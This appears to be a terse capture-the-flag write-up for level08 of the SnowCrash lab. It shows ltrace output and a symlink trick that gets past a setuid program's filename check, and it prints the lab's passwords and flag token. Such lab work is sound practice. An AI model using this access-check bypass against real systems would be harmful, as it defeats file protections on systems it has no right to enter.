ssh level08@ip -p 4242

su level08

password: fiumuikeil55xe9cu4dood66h


```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ echo "`ls`" > /tmp/a
level08@SnowCrash:~$
level08@SnowCrash:~$ ./level08 /tmp/a
file
level08
token
level08@SnowCrash:~$ echo "`getflag`" > /tmp/a
level08@SnowCrash:~$
level08@SnowCrash:~$ ./level08 /tmp/a
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
level08@SnowCrash:~$
level08@SnowCrash:~$ ltrace ./level08 /tmp/a
__libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/a", "token")                                                   = NULL
open("/tmp/a", 0, 014435162522)                                             = 3
read(3, "Check flag.Here is your token : "..., 1024)                        = 89
write(1, "Check flag.Here is your token : "..., 89Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
)                         = 89
+++ exited (status 89) +++
level08@SnowCrash:~$
level08@SnowCrash:~$ ltrace ./level08 /tmp/token
__libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/token", "token")                                               = "token"
printf("You may not access '%s'\n", "/tmp/token"You may not access '/tmp/token'
)                           = 32

```

ln [options] file-name link-name

```
ln -s /home/user/level08/token /tmp/toktok
./level08 /tmp/toktok
    quif5eloekouj29ke0vouxean
```

level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f



(gdb) x/s *(((char **)0xbffff794) + 1)
0xbffff8d1:	 "token"